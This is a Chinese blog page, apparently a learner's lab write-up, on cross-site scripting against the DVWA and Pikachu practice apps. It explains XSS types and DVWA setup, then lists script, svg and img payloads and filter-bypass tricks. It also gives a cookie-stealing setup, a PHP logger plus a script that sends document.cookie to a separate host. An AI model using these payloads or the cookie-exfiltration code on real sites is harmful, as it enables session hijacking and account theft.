@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="明 尘">
+    
+    
+    
+    
+    
+    
+    <title>xss | 文心雕龙</title>
+    <link href="http://example.com" rel="prefetch" />
+
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/aos.css">
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/bootstrap.min.js"></script>
+
+    
+<script src="/js/aos.js"></script>
+
+    
+<script src="/js/highslide/highslide-full.min.js"></script>
+
+    
+<link rel="stylesheet" href="/js/highslide/highslide.css">
+
+    <style type="text/css">
+        @media (max-width: 768px) {
+            body {
+                background-color: #f0f0f0;
+                background: url('/imgs/xsbg.gif');
+                background-attachment: fixed;
+            }
+        }
+    </style>
+    
+    <!--<script type="text/javascript">
+      if (document.images) {
+        var avatar = new Image();
+        avatar.src = '/imgs/avatar.jpg'
+        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg,preview5.jpg,preview6.jpg,preview7.jpg'.split(',')
+        var previewsPreLoad = []
+        for(var i = 0; i < length; i++) {
+          previewsPreLoad.push(new Image())
+          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
+        }
+      }
+    </script>-->
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+    <!-- 背景轮播图功能 -->
+    <section class="hidden-xs">
+    <ul class="cb-slideshow">
+        <li><span>天若</span></li>
+        <li><span>有情</span></li>
+        <li><span>天亦老</span></li>
+        <li><span>我为</span></li>
+        <li><span>长者</span></li>
+        <li><span>续一秒</span></li>
+    </ul>
+</section>
+    <!-- 欧尼酱功能, 谁用谁知道 -->
+    
+    <header class="navbar navbar-inverse" id="gal-header">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed"
+                    data-toggle="collapse" data-target=".bs-navbar-collapse"
+                    aria-expanded="false">
+                <span class="fa fa-lg fa-reorder"></span>
+            </button>
+            <a href="http://example.com">
+                
+                <style>
+                    #gal-header .navbar-brand {
+                        height: 54px;
+                        line-height: 24px;
+                        font-size: 28px;
+                        opacity: 1;
+                        background-color: rgba(0,0,0,0);
+                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
+                    }
+                </style>
+                <!-- 这里使用文字(navbar_text or config.title) -->
+                <div class="navbar-brand">文心雕龙</div>
+                
+            </a>
+        </div>
+        <div class="collapse navbar-collapse bs-navbar-collapse">
+            <ul class="nav navbar-nav" id="menu-gal">
+                
+                
+                <li class="">
+                    <a href="/">
+                        <i class="fa fa-home"></i>首页
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>归档
+                    </a>
+                </li>
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-list"></i>分类
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/web%E5%89%8D%E7%AB%AF/">web前端</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/php/">php</a>
+                        </li>
+                        
+                        
+                        <li>
+                            <a href="/categories">...</a>
+                        </li>
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-tags"></i>标签
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/tags/Linux/">Linux</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/DNS%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/">DNS域名解析</a>
+                        </li>
+                        
+                        
+                        <li>
+                            <a href="/tags">...</a>
+                        </li>
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/about">
+                        <i class="fa fa-user"></i>关于我
+                    </a>
+                </li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</header>
+    <div id="gal-body">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 gal-right" id="mainstay">
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="http://example.com">文心雕龙</a>
+        >
+        <span>xss</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2024/01/16/xss/">xss</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2024-01-16
+            </span>
+            
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2024/01/16/xss/">xss</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2024-01-16
+            </p>
+            <p>
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <h2><span id="xss攻击简介">XSS攻击简介</span></h2><p>​	XSS全称是Cross Site Scripting即跨站脚本，当目标网站目标用户浏览器渲染HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就发生了。</p>
+<p>作为一种HTML注入攻击，XSS攻击的核心思想就是在HTML页面中注入恶意代码，而XSS采用的注入方式是非常巧妙的。在XSS攻击中，一般有三个角色参与：攻击者、目标服务器、受害者的浏览器。</p>
+<p>由于有的服务器并没有对用户的输入进行安全方面的验证，攻击者就可以很容易地通过正常的输入手段，夹带进一些恶意的HTML脚本代码。当受害者的浏览器访 问目标服务器上被注入恶意脚本的页面后，由于它对目标服务器的信任，这段恶意脚本的执行不会受到什么阻碍。而此时，攻击者的目的就已经达到了。</p>
+<h3><span id="xss原理">XSS原理</span></h3><p>XSS的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。</p>
+<h3><span id="xss攻击类型">XSS攻击类型</span></h3><p>根据XSS脚本注入方式的不同，我们可以将XSS攻击简单的分类为反射型XSS、存储型XSS、DOM-based 型、基于字符集的 XSS、基于 Flash 的跨站 XSS、未经验证的跳转 XSS 6种类型。</p>
+<h3><span id="dvwa-简介">DVWA 简介</span></h3><p>　　DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP&#x2F;MySQL Web 应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p>
+<p>　　DVWA 一共包含了十个攻击模块，分别是：Brute Force（暴力（破解））、Command Injection（命令行注入）、CSRF（跨站请求伪造）、- File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA （不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、XSS（Reflected）（反射型跨站脚本）、XSS（Stored）（存储型跨站脚本）。包含了 OWASP TOP10 的所有攻击漏洞的练习环境，一站式解决所有 Web 渗透的学习环境。</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116113108915.png" alt="image-20240116113108915"></p>
+<p>DVWA安装</p>
+<p>准备 PHP 和 MySQL 的运行环境。</p>
+<p>安装环境所需工具下载地址：<br>　　 - PHPStudy：<a href="https://link.zhihu.com/?target=http://phpstudy.php.cn/download.html">http://phpstudy.php.cn/download.html</a><br>　　 - DVWA：<a href="https://link.zhihu.com/?target=https://github.com/ethicalhack3r/DVWA/archive/master.zip">https://github.com/ethicalhack3r/DVWA/archive/master.zip</a></p>
+<p><em>解压下载的 DVWA-master.zip，为方便后期访问，把解压的文件夹改名为 DVWA，把该文件夹复制到 PHPStudy 的默认 Web 站点根目录 D:\phpstudy\PHPTutorial\WWW ，如图 4-5 所示。</em></p>
+<p><em>WWW\DVWA\config 目录下，找到 config.inc.php.dist 文件，重命名为 config.inc.php，</em></p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116113450055.png" alt="image-20240116113450055"></p>
+<p><em>把配置文档中的 $_DVWA[ ‘db_password’ ] &#x3D; ‘P@ssw0rd’; 修改为 $_DVWA[ ‘db_password’ ] &#x3D; ‘root’;</em></p>
+<p><em>使用浏览器（推荐 Chrome）访问站点安装页面，URL 使用本机 IP 地址即可，</em></p>
+<p><em>在安装页面下方点击 Creat &#x2F; Reset Database 按钮来创建数据库，出现提示 Setup Success 则说明安装成功，如图 4-9。如果此处创建失败，检查上一步 MySQL 密码是否正确</em></p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116113831296.png" alt="image-20240116113831296"></p>
+<p><em>点击 login，进入登录页面，使用默认用户 admin，密码 password 登录到渗透练习页面，</em></p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116113807409.png" alt="image-20240116113807409"></p>
+<p><em>点击 DVWA Security 按钮，在这个页面中可以设置 DVWA 的安全级别，可以发现当前默认的安全级别为 Impossible，</em>可以改成low。</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116113716236.png" alt="image-20240116113716236"></p>
+<h2><span id="xss的攻击载荷">XSS的攻击载荷</span></h2><p>以下所有标签的 &gt; 都可以用 &#x2F;&#x2F; 代替， 例如 <script>alert(1)</script//</p>
+<script>标签：<script>标签是最直接的XSS有效载荷，脚本标记可以引用外部的JavaScript代码，也可以将代码插入脚本标记中
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;   #弹出hack<br>&lt;script&gt;alert(/hack/)&lt;/script&gt;   #弹出hack<br>&lt;script&gt;alert(1)&lt;/script&gt;        #弹出1，对于数字可以不用引号<br>&lt;script&gt;alert(document.cookie)&lt;/script&gt;      #弹出cookie<br>&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss<br></code></pre></td></tr></table></figure>
+
+**svg标签**
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;svg onload=&quot;alert(1)&quot;&gt;<br>&lt;svg onload=&quot;alert(1)&quot;//<br></code></pre></td></tr></table></figure>
+
+<img>标签：
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;img  src=1  οnerrοr=alert(&quot;hack&quot;)&gt;<br>&lt;img  src=1  οnerrοr=alert(document.cookie)&gt;  #弹出cookie<br></code></pre></td></tr></table></figure>
+
+**<body>标签：**
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;body οnlοad=alert(1)&gt;<br>&lt;body οnpageshοw=alert(1)&gt;<br></code></pre></td></tr></table></figure>
+
+**video标签:**
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;video οnlοadstart=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;<br></code></pre></td></tr></table></figure>
+
+**style标签：**
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;<br></code></pre></td></tr></table></figure>
+
+## XSS可以插在哪里？
+
+- 用户输入作为script标签内容
+- 用户输入作为HTML注释内容
+- 用户输入作为HTML标签的属性名
+- 用户输入作为HTML标签的属性值
+- 用户输入作为HTML标签的名字
+- 直接插入到CSS里
+- 最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里！
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs text">#用户输入作为HTML注释内容，导致攻击者可以进行闭合绕过<br>&lt;!-- 用户输入 --&gt;<br>&lt;!-- --&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;!-- --&gt;<br> <br>#用户输入作为标签属性名，导致攻击者可以进行闭合绕过<br>&lt;div 用户输入=&quot;xx&quot;&gt;  &lt;/div&gt;<br>&lt;div &gt;&lt;/div&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;div a=&quot;xx&quot;&gt; &lt;/div&gt;<br> <br>#用户输入作为标签属性值，导致攻击者可以进行闭合绕过<br>&lt;div id=&quot;用户输入&quot;&gt;&lt;/div&gt;<br>&lt;div id=&quot;&quot;&gt;&lt;/div&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;div a=&quot;x&quot;&gt;&lt;/div&gt;<br> <br>#用户输入作为标签名，导致攻击者可以进行闭合绕过<br>&lt;用户输入  id=&quot;xx&quot; /&gt;<br>&lt;&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;b id=&quot;xx&quot; /&gt;<br> <br>#用户输入作为CSS内容，导致攻击者可以进行闭合绕过<br>&lt;style&gt;用户输入&lt;style&gt;<br>&lt;style&gt; &lt;/style&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;style&gt; &lt;/style&gt;<br></code></pre></td></tr></table></figure>
+
+## XSS
+
+### HTTP状态码:
+
+1XX:继续
+
+2XX:成功
+
+302:重定向
+
+400/404:客户端错误
+
+502/503:服务端错误
+
+### XSS反射
+
+启动apache      service apache2 start
+
+查看IP  ifconfig
+
+在浏览器打开
+
+![image-20240116153105114](https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116153105114.png)
+
+移动到/var/www/html
+
+cd /var/www/html
+
+新建cookie.php、cookie.txt
+
+![image-20240116153510302](https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116153510302.png)
+
+cookie.php:
+
+<?php 
+
+$cookie=$_GET['cookie']; 
+
+file_put_contents('cookie.txt',$cookie); 
+
+?>
+
+查看apache服务运行的所有者: ps -axu | grep apache
+
+![image-20240116153432614](https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116153432614.png)
+
+修改cookie.txt所有者chown www-data:www-data cookie.txt
+
+![image-20240116153639554](https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116153639554.png)
+
+构造xss漏洞加载cookie.php的恶意连接
+
+<script>document.location='http://192.168.46.131/cookie.php?cookie='+document.cookie</script>
+
+</p><p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116153924451.png" alt="image-20240116153924451"></p>
+<p>查看cookie.txt</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116153856329.png" alt="image-20240116153856329"></p>
+<p>清除cookie.txt</p>
+<p>将<script>document.location='<a target="_blank" rel="noopener" href="http://192.168.46.131/cookie.php?cookie=%27+document.cookie">http://192.168.46.131/cookie.php?cookie=&#39;+document.cookie</a></script>变成URL编码</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116155607922.png" alt="image-20240116155607922"></p>
+<p>随意输入</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116155703054.png" alt="image-20240116155703054"></p>
+<p>在网址覆盖输入的<img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116155840287.png" alt="image-20240116155840287"></p>
+<p>显示空白页面<img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116155926073.png" alt="image-20240116155926073"></p>
+<p>查看cookie.txt</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116160106036.png" alt="image-20240116160106036"></p>
+<h3><span id="cookie劫持">cookie劫持</span></h3><p>在xss(Reflected)框重输入</p>
+<script> 
+window.onload = function() { 
+var link=document.getElementsByTagName("a"); 
+for(j = 0; j < link.length; j++) { 
+ link[j].href="https://www.baidu.com";} 
+} 
+</script>
+
+<p>点击其他地方都会跳转到百度</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116170352223.png" alt="image-20240116170352223"></p>
+<p>若要取消则需要删除所有cookie会话，在刷新重新登录。</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116170824897.png" alt="image-20240116170824897"></p>
+<h3><span id="存储型xss">存储型xss</span></h3><p>存储型XSS f12，将输入框maxlength改成100</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116173531151.png" alt="image-20240116173531151"></p>
+<p>输入<code>&lt;script&gt;document.location=&#39;http://192.168.2.104/cookie.php?cookie=&#39;+document.cookie&lt;/script&gt;</code></p>
+<p>message随便输入，提交</p>
+<p>之后点击存储型XSS这关，就会跳转。</p>
+<p>要删除所有cookie，重新登录，清除Clear Guestbook</p>
+<h3><span id="反射型xssget">反射型xss(get)</span></h3><p>GET是以url方式提交数据;POST是以表单方式在请求体里面提交。通过get提交的数据是可以直接在url中看到的，所以GET方式的XSS漏洞更加容易被利用, 一般利用的方式是将带有跨站脚本的URL伪装后发送给目标，而POST方式由于是以表单方式提交,无法直接使用URL方式进行攻击。</p>
+<p>我们发现后边的内容被截断了，判断可能有字符数量限制，F12找一下看看，找到字符限制20 </p>
+<p>直接前端修改字符数到2000再尝试，成功弹窗。 并且写入的js语句是在url中直接显示的。</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116194228141.png" alt="image-20240116194228141"></p>
+<p>提交</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240116194249891.png" alt="image-20240116194249891"></p>
+<h3><span id="dom型xss">Dom型xss</span></h3><p>DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是前端的DOM解析，可以认为完全前端的事情。用户输入的参数中如果包含js语句，输入内容就会被当做js执行，就有可能导致DOM XSS</p>
+<p>输入123后，点击click me下面显示出来what do you see?，我们查看前端代码发现123直接赋值给了a标签的href，这就导致了xss漏洞产生。<br>payload使用： javascript:alert(“123”)</p>
+<p>输入之后，点击what do you see？发生弹窗。</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240117145325813.png" alt="image-20240117145325813"></p>
+<h3><span id="dom型xss-x">Dom型xss -x</span></h3><p>‘οnclick&#x3D;”alert(666)”&gt;</p>
+<p>查看源代码”&gt;闭合掉了a标签</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240117145926866.png" alt="image-20240117145926866"></p>
+<p>XSS之-盲打<br> XSS盲打指的是一种攻击场景，在数据提交界面提交数据后，前端不管是url还是源代码都看不到输入的内容和效果，这种数据只有后端管理员可以看见，当管理员触发盲打被X到的话，危害是非常大的，很可能造成管理员的cookie泄露，使攻击者可以通过管理员权限登录网站后台。我们尝试输入一段xss的payload 提交上去，按照提示前往管理员后台。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">&lt;script&gt;alert(&#x27;你被X了&#x27;)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>一登陆，发现被弹窗，进入后看到了留言者的信息。</p>
+<h3><span id="xss之过滤">XSS之过滤</span></h3><p>输入&lt;&gt;,.<script>/?;:'"[{]}|alert，发现被过滤。</p>
+<p>判断可能过滤了<script>标签，尝试大小写混写看看能否绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">&lt;scRIPt&gt;alert(666)&lt;/ScrIpt&gt;<br></code></pre></td></tr></table></figure>
+
+<p> 输入后发生弹窗，观察发现大小写混写的<script>标签未被过滤。</p>
+<p>因为判断可能是过滤<script>标签，我们尝试用<img>注入试试，发现也可以弹窗。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">&lt;img src=x onerror=&quot;alert(666)&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240117152920623.png" alt="image-20240117152920623"></p>
+<h3 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h3><p>htmlspecialchars() 函数把一些预定义的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6/4768913?fromModule=lemma_inlink">字符</a>转换为 HTML 实体。</p>
+<p>预定义的字符是：</p>
+<p>&（和号） 成为<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%26amp%3B?fromModule=lemma_inlink">&</a></p>
+<p>" （双引号） 成为 "</p>
+<p>' （单引号） 成为 '</p>
+<p>< （小于） 成为 <</p>
+<p>&gt; （大于） 成为 ></p>
+<p>唯独' (单引号)没有转换成html实体并且单引号闭合了href的赋值。</p>
+<p>我们可以写入   XXX' οnclick='alert(666)'  ，XXX后的单引号用于闭合href的赋值</p>
+<p>XXX' onclick='alert(666)'<br>输入后值被记录，且给a标签熟悉添加了 οnclick='alert(666)'</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240117165131976.png" alt="image-20240117165131976"></p>
+<p>点击 XXX' οnclick='alert(666)' 的链接，发生弹窗</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240117165416651.png" alt="image-20240117165416651"></p>
+<h3 id="xss之href输出和xss之js输入"><a href="#xss之href输出和xss之js输入" class="headerlink" title="xss之href输出和xss之js输入"></a>xss之href输出和xss之js输入</h3><p>先打开xss之href输出，input框中输入</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">javascript:<span class="hljs-built_in">alert</span>(<span class="hljs-string">&quot;href输出&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>发现 javascript:alert("123")赋值给了href，点击阁下自己的url，alert被执行，发生弹窗。</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240117144123623.png" alt="image-20240117144123623"></p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240117144307454.png" alt="image-20240117144307454"></p>
+<p>打开xss之js输入，在输入框输入tmac，发现输入内容赋值给$mc，由单引号闭合</p>
+<p>尝试构造payload，  <code>x&#39;&lt;/script&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code> 使用单引号闭合$mc，再由<code>&lt;/script&gt;</code>闭合script标签，而后构造script标签，写入alert弹窗，成功弹出。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">x&#x27;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;js输入&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240117143957994.png" alt="image-20240117143957994"></p>
+</script></p>
+    </div>
+</article>
+
+
+                </div>
+                <aside class="col-md-4 gal-left" id="sidebar">
+    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
+<aside id="sidebar-search">
+    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <form class="form-inline clearfix" id="search-form" method="get"
+              action="/search/index.html">
+            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~" autocomplete="off">
+            <button class="btn btn-danger btn-gal" type="submit">
+                <i class="fa fa-search"></i>
+            </button>
+        </form>
+    </div>
+</aside>
+    <aside id="sidebar-author">
+    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
+        <div class="panel-heading" style="text-align: center">
+            <i class="fa fa-quote-left"></i>
+            明 尘
+            <i class="fa fa-quote-right"></i>
+        </div>
+        <div class="author-panel text-center">
+            <img src="/imgs/avatar.jpg" width="140" height="140"
+                 alt="个人头像" class="author-image">
+            <p class="author-description"></p>
+        </div>
+    </div>
+</aside>
+    
+    <aside id="sidebar-recent_comments">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-comments"></i>
+            最新评论
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush"></ul>
+    </div>
+</aside>
+    
+    <!-- 要配置好leancloud才能开启此小工具 -->
+    
+    
+    <aside id="sidebar-recent_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            近期文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/21/webshall%E5%85%8D%E6%9D%80/">webshall免杀</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/19/beef/">beef</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/16/xss/">xss</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/12/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/">靶机练习</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传漏洞</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/08/sqli%E9%80%9A%E5%85%B3/">sqli通关</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/08/tg%E6%B3%A8%E5%86%8C%E5%92%8C%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/">tg注册和永恒之黑</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/07/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/05/vmware/"></a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/04/virtual%E5%92%8Cpicachu/">virtual和pikachu</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="sidebar-rand_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            随机文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/02/Linux%E5%91%BD%E4%BB%A4/">Linux命令</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/13/php%E5%AD%A6%E4%B9%A01/">php学习1</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/16/php%E5%AE%9E%E6%93%8D/">php实操</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/06/python%E5%AD%A6%E4%B9%A0/">python学习</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/19/sql%E6%B3%A8%E5%85%A51/">sql注入1</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/08/vue%E5%AD%A6%E4%B9%A0/">vue学习</a>
+                </span>
+            </li>
